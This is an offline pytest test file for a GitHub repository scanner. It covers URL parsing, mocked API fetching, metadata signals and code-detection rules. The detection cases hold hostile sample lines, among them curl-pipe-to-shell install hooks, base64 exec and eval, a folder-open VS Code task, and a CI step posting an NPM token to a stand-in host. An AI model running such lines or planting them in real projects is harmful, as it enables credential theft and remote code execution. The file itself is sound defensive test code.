"""GitHub repo scanning: offline tests only. Network is replaced by monkeypatching `_get` or urlopen."""
from __future__ import annotations

import io
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone

import pytest

import scanything.repo as rp
from scanything import attack

SHA = "a" * 40
NOW = datetime(2026, 10, 26, 12, 0, tzinfo=timezone.utc)


# ---------- parse_github ----------

@pytest.mark.parametrize("target, expected", [
    ("https://github.com/octocat/Hello-World", ("octocat", "Hello-World", None)),
    ("https://github.com/octocat/Hello-World.git", ("octocat", "Hello-World", None)),
    ("https://github.com/octocat/Hello-World/", ("octocat", "Hello-World", None)),
    ("https://www.github.com/a.b_c/d-e.f", ("a.b_c", "d-e.f", None)),
    ("https://github.com/o/r/tree/main", ("o", "r", "main")),
    ("https://github.com/o/r/tree/feature/x/", ("o", "r", "feature/x")),
    ("github:octocat/Hello-World", ("octocat", "Hello-World", None)),
    ("github:octocat/Hello-World@v1.2.3", ("octocat", "Hello-World", "v1.2.3")),
    ("  github:o/r@release/2.0  ", ("o", "r", "release/2.0")),
])
def test_parse_github_valid(target, expected):
    assert rp.parse_github(target) == expected


@pytest.mark.parametrize("target", [
    "", "https://gitlab.com/o/r", "https://github.com/o", "https://github.com/o/r/issues/1",
    "https://github.com/../..", "https://github.com/./r", "github:o/r@", "github:o/r/extra",
    "github:o", "github:../x", "github:o/r;rm", "https://github.com/o/r/tree",
    "ftp://github.com/o/r",
])
def test_parse_github_invalid(target):
    assert rp.parse_github(target) is None


# ---------- HTTP layer (urlopen replaced, never the network) ----------

class _FakeResp:
    def __init__(self, data: bytes):
        self._buf = io.BytesIO(data)

    def read(self, n=-1):
        return self._buf.read() if n is None or n < 0 else self._buf.read(n)

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _http_error(code, headers=None):
    def boom(req, timeout=None):
        raise urllib.error.HTTPError(req.full_url, code, "err", headers or {}, None)
    return boom


def test_get_sends_token_when_set(monkeypatch):
    seen = {}

    def fake_open(req, timeout=None):
        seen["auth"] = req.get_header("Authorization")
        seen["ua"] = req.get_header("User-agent")
        seen["timeout"] = timeout
        return _FakeResp(b"{}")

    monkeypatch.setattr(urllib.request, "urlopen", fake_open)
    monkeypatch.setenv("GITHUB_TOKEN", "tok123")
    assert rp._get("https://api.github.com/x") == {}
    assert seen == {"auth": "Bearer tok123", "ua": "scanything", "timeout": 30}


def test_get_no_auth_header_without_token(monkeypatch):
    seen = {}

    def fake_open(req, timeout=None):
        seen["auth"] = req.get_header("Authorization")
        return _FakeResp(b"{}")

    monkeypatch.setattr(urllib.request, "urlopen", fake_open)
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    rp._get("https://api.github.com/x")
    assert seen["auth"] is None


def test_get_404_is_repo_error(monkeypatch):
    monkeypatch.setattr(urllib.request, "urlopen", _http_error(404))
    with pytest.raises(rp.RepoError, match="not found"):
        rp._get("https://api.github.com/repos/o/missing")


def test_get_rate_limit_hint_mentions_token(monkeypatch):
    monkeypatch.setattr(urllib.request, "urlopen",
                        _http_error(403, {"X-RateLimit-Remaining": "0"}))
    with pytest.raises(rp.RepoError, match="GITHUB_TOKEN"):
        rp._get("https://api.github.com/repos/o/r")


def test_get_network_error_is_repo_error(monkeypatch):
    def down(req, timeout=None):
        raise urllib.error.URLError("no route")
    monkeypatch.setattr(urllib.request, "urlopen", down)
    with pytest.raises(rp.RepoError, match="network error"):
        rp._get("https://api.github.com/repos/o/r")


# ---------- fetch_repo (with _get monkeypatched) ----------

def _fake_get(calls, meta=None, sha=SHA, users=None, zip_bytes=b"PK-fake-archive"):
    meta = meta if meta is not None else {
        "full_name": "o/r", "html_url": "https://github.com/o/r", "default_branch": "main",
        "stargazers_count": 3, "forks_count": 1, "watchers_count": 3, "open_issues_count": 0,
        "created_at": "2020-01-01T00:00:00Z", "pushed_at": "2024-01-01T00:00:00Z",
        "size": 42, "archived": False, "fork": False,
        "license": {"spdx_id": "MIT"}, "owner": {"login": "o", "type": "User"},
    }
    users = users if users is not None else {"created_at": "2019-05-05T00:00:00Z"}

    def fake(url, binary=False, limit=None):
        calls.append({"url": url, "binary": binary, "limit": limit})
        if url == "https://api.github.com/repos/o/r":
            return meta
        if url.startswith("https://api.github.com/repos/o/r/commits/"):
            return {"sha": sha}
        if url.startswith("https://api.github.com/users/"):
            if isinstance(users, Exception):
                raise users
            return users
        if url.startswith("https://codeload.github.com/o/r/zip/"):
            return zip_bytes if limit is None else zip_bytes[: limit + 1]
        raise AssertionError(f"unexpected URL {url}")
    return fake


def test_fetch_pins_commit_and_builds_info(monkeypatch):
    calls: list[dict] = []
    monkeypatch.setattr(rp, "_get", _fake_get(calls))
    data, info = rp.fetch_repo("o", "r", max_bytes=1024)

    assert data == b"PK-fake-archive"
    urls = [c["url"] for c in calls]
    assert urls[0] == "https://api.github.com/repos/o/r"
    assert urls[1] == "https://api.github.com/repos/o/r/commits/main"
    assert urls[-1] == f"https://codeload.github.com/o/r/zip/{SHA}"
    assert calls[-1]["binary"] is True and calls[-1]["limit"] == 1024
    assert info["commit"] == SHA
    assert info["ref"] == "main"
    assert info["repo"] == "o/r"
    assert info["license"] == "MIT"
    assert info["owner"] == "o" and info["owner_type"] == "User"
    assert info["owner_created_at"] == "2019-05-05T00:00:00Z"
    assert info["stars"] == 3 and info["forks"] == 1 and info["size_kb"] == 42


def test_fetch_uses_explicit_ref(monkeypatch):
    calls: list[dict] = []
    monkeypatch.setattr(rp, "_get", _fake_get(calls))
    _, info = rp.fetch_repo("o", "r", ref="feature/x")
    assert calls[1]["url"] == "https://api.github.com/repos/o/r/commits/feature/x"
    assert info["ref"] == "feature/x"


def test_fetch_owner_lookup_failure_is_ignored(monkeypatch):
    calls: list[dict] = []
    monkeypatch.setattr(rp, "_get", _fake_get(calls, users=rp.RepoError("boom")))
    _, info = rp.fetch_repo("o", "r")
    assert info["owner_created_at"] is None


def test_fetch_size_limit_raises(monkeypatch):
    calls: list[dict] = []
    monkeypatch.setattr(rp, "_get", _fake_get(calls, zip_bytes=b"x" * 100))
    with pytest.raises(rp.RepoError, match="larger than 16 bytes"):
        rp.fetch_repo("o", "r", max_bytes=16)


def test_fetch_404_on_repo_is_repo_error(monkeypatch):
    monkeypatch.setattr(urllib.request, "urlopen", _http_error(404))
    with pytest.raises(rp.RepoError, match="not found"):
        rp.fetch_repo("o", "missing")


def test_fetch_rejects_non_sha_commit(monkeypatch):
    calls: list[dict] = []
    monkeypatch.setattr(rp, "_get", _fake_get(calls, sha="not-a-sha"))
    with pytest.raises(rp.RepoError, match="could not resolve"):
        rp.fetch_repo("o", "r")


# ---------- metadata_signals ----------

def _info(**over):
    base = {"repo": "o/r", "owner": "o", "stars": 10, "forks": 2, "created_at": "2020-01-01T00:00:00Z",
            "owner_created_at": "2015-01-01T00:00:00Z", "archived": False, "fork": False}
    base.update(over)
    return base


def _ids(sigs):
    return {s["id"] for s in sigs}


def test_star_farming_fires_on_young_owner_with_stars():
    ago10 = (NOW - timedelta(days=10)).isoformat()
    got = rp.metadata_signals(_info(owner_created_at=ago10, stars=80), now=NOW)
    s = next(x for x in got if x["id"] == "star_farming_suspect")
    assert s["severity"] == "medium" and "fp_note" in s


def test_star_farming_silent_when_few_stars_or_old_owner():
    ago10 = (NOW - timedelta(days=10)).isoformat()
    assert "star_farming_suspect" not in _ids(rp.metadata_signals(_info(owner_created_at=ago10, stars=49), now=NOW))
    assert "star_farming_suspect" not in _ids(
        rp.metadata_signals(_info(owner_created_at="2016-01-01T00:00:00Z", stars=500), now=NOW))


def test_new_repo_window():
    recent = (NOW - timedelta(days=3)).isoformat()
    old = (NOW - timedelta(days=90)).isoformat()
    assert "new_repo" in _ids(rp.metadata_signals(_info(created_at=recent), now=NOW))
    assert "new_repo" not in _ids(rp.metadata_signals(_info(created_at=old), now=NOW))


def test_no_community_archived_and_fork():
    got = _ids(rp.metadata_signals(_info(stars=0, forks=0, archived=True, fork=True), now=NOW))
    assert {"no_community", "archived_repo", "forked_repo"} <= got
    assert "no_community" not in _ids(rp.metadata_signals(_info(stars=0, forks=1), now=NOW))


def test_metadata_signals_are_info_or_medium_only():
    got = rp.metadata_signals(_info(stars=0, forks=0, archived=True, fork=True,
                                    created_at=NOW.isoformat()), now=NOW)
    assert {s["severity"] for s in got} <= {"info", "medium"}


# ---------- code_signals ----------

CASES = [
    ("npm_install_hook", "pkg/package.json",
     '{"scripts": {"install": "curl https://example.invalid/x.sh | sh"}}',
     "package.json", '{"scripts": {"install": "node-gyp rebuild"}}'),
    ("python_setup_exec", "setup.py",
     "import base64\nexec(base64.b64decode(blob))\n",
     "setup.py", "exec(open('version.py').read())\nsetup(name='demo')\n"),
    ("python_obfuscated_exec", "tool.py",
     "exec(__import__('base64').b64decode(x))\n",
     "tool.py", "exec(compile(src, 'tool.py', 'exec'))\n"),
    ("js_obfuscated_eval", "app.js",
     "eval(atob('YWxlcnQoMSk='))\n",
     "app.js", "const s = Buffer.from(x, 'base64').toString();\n"),
    ("vscode_autorun", ".vscode/tasks.json",
     '{"tasks":[{"label":"w","command":"node watch.js","runOptions":{"runOn":"folderOpen"}}]}',
     ".vscode/tasks.json", '{"tasks":[{"label":"build","command":"make"}]}'),
    ("msbuild_event", "app/app.csproj",
     "<Project><PreBuildEvent>powershell -c iwr x</PreBuildEvent></Project>",
     "app/app.csproj", "<Project><PreBuildEvent>xcopy /y a.dll b\\</PreBuildEvent></Project>"),
    ("gha_secret_exfil", ".github/workflows/ci.yml",
     'steps:\n  - run: curl -d "${{ secrets.NPM_TOKEN }}" https://example.invalid\n',
     ".github/workflows/ci.yml",
     "env:\n  TOKEN: ${{ secrets.NPM_TOKEN }}\nsteps:\n  - run: pytest -q\n"),
    ("gha_pwn_request", ".github/workflows/pr.yml",
     "on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n"
     "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
     ".github/workflows/pr.yml",
     "on: pull_request_target\njobs:\n  label:\n    steps:\n      - uses: actions/labeler@v5\n"),
    ("curl_pipe_shell", "install.sh",
     "curl -fsSL https://example.invalid/i.sh | sudo bash\n",
     "README.md", "Install with: curl -fsSL https://example.invalid/i.sh | sh\n"),
    ("hidden_far_right_code", "a.py",
     "x = 1" + " " * 200 + "os.system('id')\n",
     "a.py", "def f(x):\n    return x + 1\n"),
    ("trojan_source_bidi", "a.py",
     "if access_level == 'user\u202e':\n    pass\n",
     "a.py", "if access_level == 'user':\n    pass\n"),
    ("build_rs_command", "build.rs",
     'fn main() { std::process::Command::new("sh").arg("-c").arg("id"); }',
     "build.rs", 'fn main() { std::process::Command::new("cargo").arg("build"); }'),
]


@pytest.mark.parametrize("rule_id, path, positive, _bp, _bt", CASES, ids=[c[0] for c in CASES])
def test_code_rule_fires_on_positive(rule_id, path, positive, _bp, _bt):
    assert rule_id in {s["id"] for s in rp.code_signals(path, positive)}


@pytest.mark.parametrize("rule_id, _p, _pos, benign_path, benign", CASES, ids=[c[0] for c in CASES])
def test_code_rule_silent_on_benign(rule_id, _p, _pos, benign_path, benign):
    assert rule_id not in {s["id"] for s in rp.code_signals(benign_path, benign)}


def test_code_rule_one_signal_per_file():
    got = rp.code_signals("app.js", "eval(atob(a))\neval(atob(b))\neval(atob(c))\n")
    assert [s["id"] for s in got].count("js_obfuscated_eval") == 1


def test_code_signal_detail_and_fp_note():
    s = next(x for x in rp.code_signals("app.js", "eval(atob('x'))") if x["id"] == "js_obfuscated_eval")
    assert s["detail"].startswith("eval of decoded data: app.js: ")
    assert s["fp_note"]
    assert s["severity"] == "high"


def test_is_source_path():
    for p in ["package.json", "sub/setup.py", ".vscode/tasks.json", ".github/workflows/ci.yml",
              "x/y.csproj", "tools/run.ps1", "build.rs", "a/b/c.py", "d/e.json"]:
        assert rp.is_source_path(p), p
    for p in ["README.md", "logo.png", "docs/guide.rst", "LICENSE"]:
        assert not rp.is_source_path(p), p


def test_every_code_rule_is_mapped_to_attack():
    for rule in rp.CODE_RULES:
        assert rule[0] in attack.SIGNAL_MAP, rule[0]
    for tids in attack.SIGNAL_MAP.values():
        assert all(t in attack.TECHNIQUES for t in tids)
